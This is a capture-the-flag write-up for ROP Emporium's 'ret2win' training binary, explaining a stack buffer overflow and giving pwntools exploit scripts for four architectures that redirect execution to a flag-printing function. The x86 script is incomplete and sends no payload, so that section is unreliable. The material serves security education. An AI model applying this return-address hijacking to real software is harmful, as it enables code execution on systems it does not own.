ret2win

Name: ret2win
Subtitle: Locate a method that you want to call within the binary. Call it by overwriting a saved return address on the stack. Click below to download the binary.
Binaries: x86_64, x86, ARMv5, MIPS
Files: ret2win.zip, ret2win32.zip, ret2win_armv5.zip, ret2win_mipsel.zip
Description:
# No spoilers here
Take the time to read these challenge pages, there aren't any spoilers and they contain important information that could save you some frustration. If you're unfamiliar with ROP tools of the trade then check out the Beginners' guide. As it states: you'll feed each binary with a quantity of garbage followed by your ROP chain. In this case there is a magic method we want to call and we'll do so by overwriting a saved return address on the stack, certainly nothing that could be called a 'chain' by any stretch of the imagination but we've got to start somewhere. We'll do a little RE to confirm some information but nothing serious.

# What am I doing
These challenges use the usual CTF objective of retrieving the contents of a file named flag.txt from a remote machine by exploiting a given binary. The two most common courses of action are to somehow read flag.txt back to us directly or drop a shell and read it yourself. Let's see if ret2win has an easy way to do either of these by doing our due diligence on the x86_64 version of the challenge. We'll use the following nm one-liner to check method names: `$ nm ret2win|grep ' t '` will tell us that the suspiciously named function `ret2win` is present and radare2 confirms that it will cat the flag back to us:

```
(fcn) sym.ret2win 32
  sym.ret2win ();
push rbp
mov rbp, rsp
   ; "Thank you! Here's your flag:"
mov edi, str.Thank_you__Here_s_your_flag:
mov eax, 0
call sym.imp.printf
   ; "/bin/cat flag.txt"
mov edi, str._bin_cat_flag.txt
call sym.imp.system
nop
pop rbp
ret
```

# Double check
For a quick and dirty confirmation of how many bytes are needed to cause an overflow in the 64 bit binary you can use `$ sudo dmesg -C` to clear the kernel ring buffer, run the program and type 40 characters followed by 5 capital X's (why let the A's have all the fun) then type `$ dmesg -t` to see output that hopefully looks similar to the sample below:

```ret2win[14987]: segfault at a5858585858 ip 00000a5858585858 sp 00007ffe8c93d4e0 error 14 in libc-2.24.so[7fef0e075000+195000]```

It's worth confirming this before each challenge but typically you'll need 40 bytes of garbage to reach the saved return address in the x86_64 binaries, 44 bytes in the x86 binaries and around 36 bytes in the ARMv5 & MIPS binaries.

# Let's do this
You can solve this challenge with a variety of tools, even the echo command will work, although pwntools is suggested. If you decided to go for a more complex exploit than a ret2win then be aware that input is truncated for these simpler challenges. Find out how many bytes you have to construct your chain in each challenge using `$ ltrace <binary>` and looking at the call to `read()`. If your ROP chain seems perfect but the binary is crashing before printing the flag, see the common pitfalls section of the Beginners' guide, especially if you're using Ubuntu 18.04.

Theory

This very first ROP Emporium challenge seems to be quite light but pretty manageable with the great description and Beginners' Guide. So, reading the description the challenge starts becoming very clear, it's just a simple overflow, where we overwrite a return address so that the program executes the ret2win function instead of going through the challenge normally. I used IDA Pro to dissassemble the program and get a better view of the functions and makes it more apparent how the program is going to work:

int __fastcall main(int argc, const char **argv, const char **envp) {
  setvbuf(stdout, nullptr, 2, 0);
  puts("ret2win by ROP Emporium");
  puts("x86_64\n");
  pwnme();
  puts("\nExiting");
  return 0;
}

int pwnme() {
  _BYTE s[32]; // [rsp+0h] [rbp-20h] BYREF

  memset(s, 0, sizeof(s));
  puts("For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!");
  puts("What could possibly go wrong?");
  puts("You there, may I have your input please? And don't worry about null bytes, we're using read()!\n");
  printf("> ");
  read(0, s, 0x38u);
  return puts("Thank you!");
}

int ret2win() {
  puts("Well done! Here's your flag:");
  return system("/bin/cat flag.txt");
}

It seems that first it's going to say what challenge it is, then say the overflow vulnerability in a different function, and then there's a re2win function that gives you the flag, but it's not called from anywhere. So for this challenge we'll use the data overflow to hop to the ret2win function. And well, of course the vulnerable function is pwnme, which uses read() to pull 56 bytes into a 32-byte stack buffer, like the challenge tells you. There's no canary, no PIE, and no ASLR since it's a local binary with fixed addresses, so the only real thing that can mess this up is that, on x86_64 there's a 16-byte stack alignment requirement for system(), but we can solve that by routing execution through a singular ret gadget before jumping to the ret2win function. The one x86_64 specific thing with the 16-byte stack alignment requirement, a misaligned stack causes a crash inside system() before the flag ever prints, and the fix to this is a single ret gadget prepended to the chain, which we can find with a ROPgadget command on the binary:

shukularuni@SHUKULAP:~/ROP/ret2win$ ROPgadget --binary ret2win | grep ": ret$"
0x000000000040053e : ret

We'll use pwntools for all four versions, the idea in them all is almost the same. We just fill the buffer with `cyclic(n)` bytes of padding to reach the saved return address, then we overwrite it with the address of ret2win, and after that it's all resolved automatically via elf.sym.ret2win. Setting context.binary to the binary itself lets us use pwntools to solve with any architecture, endianness, or whatever so then when we use pack() it creates the right-sized little endian value without any manual adjustment. We use p.send() instead of p.sendline() just to avoid appending a newline byte that would push the payload over the 56-byte cap, even though it doesn't make a difference, it's just in case.

Solution - x86_64

The 64-bit version requires 40 bytes of padding (32-byte buffer + 8-byte saved RBP) and the ret gadget at 40053e to satisfy the system() 16-byte stack alignment requirement before jumping to ret2win:

from pwn import *
elf = context.binary = ELF('./ret2win')
return_addr = 0x000000000040053e
p = process()
payload = cyclic(40) + pack(return_addr) + pack(elf.sym.ret2win)
p.send(payload)
p.interactive()

Solution - x86

This 32-bit version is much easier since we don't require the alingment. Then, everything else is pretty much the same, although now context.binary produces 4-byte little endian packs automatically so we need to add that to the 40 bytes, giving us 44 bytes of total padding:

from pwn import *
elf = context.binary = ELF('./ret2win32')
p = process()

Solution - ARMv5

For ARMv5 there is no native execution on an x86 decive, so the binary has to run with QEMU emulation, which can be found in the path `/usr/arm-linux-gnueabi`. The padding returns now becomes 36 bytes (32 padding + 4 more saved) and, aside from the process spawning, the exploit code is basically the same as before:

from pwn import *
elf = context.binary = ELF('./ret2win_armv5')
p = process(['qemu-arm', '-L', '/usr/arm-linux-gnueabi', './ret2win_armv5'])
payload = cyclic(36) + pack(elf.sym.ret2win)
p.send(payload)
p.interactive()

Solution - MIPS

The MIPS version will use QEMU too, so this time we're using qemu-mipsel for little-endian MIPS and pointing root at the `/usr/mipsel-linux-gnu` path. Padding is again 36 bytes, and the script as a whole is literally just the same as the ARMv5 solution, only that we run QEMU on MIPS mode instead of ARM:

from pwn import *
elf = context.binary = ELF('./ret2win_mipsel')
p = process(['qemu-mipsel', '-L', '/usr/mipsel-linux-gnu', './ret2win_mipsel'])
payload = cyclic(36) + pack(elf.sym.ret2win)
p.send(payload)
p.interactive()

Conclusion

All of the four binaries end up doing the same small mistake, we can overflow the stack buffer in that pwnme function with enough padding to reach the saved return address, then overwrite that one with the address of the ret2win function. The flag is the same in every binary/version:

ROPE{a_placeholder_32byte_flag!}
| Binary | Padding | Gadget    | Need QEMU |
|--------|---------|-----------|-----------|
| x86_64 | 40      | Yes (ret) | No        |
| x86    | 44      | No        | No        |
| ARMv5  | 36      | No        | Yes       |
| MIPS   | 36      | No        | Yes       |

Why do all 4 architectures?
Well, it might be tantalizing to solve the x86_64 version and move on with your day, I mean the flag and concept are the same across all architectures, and the challenge doesn't really give you anything for doing that. But here's the thing, working through all four architectures significantly pays off on harder levels because, each architecture has its own calling convention, register stuff, and other quirks. For example, ARM uses branch-to-register, MIPS has branch delay slots, x86 has arguments on the stack, and x86_64 uses registers. And once these ROP challenges become something bigger than a single gadget, those differences start to matter in very cool ways. Like being comfortable using pwntools over different architectures, QEMU emulation, and the habit of reading ELF data, so all of these things now makes those later challenges seem a little bit easier to start with, since you'll have that knowledge foundation.
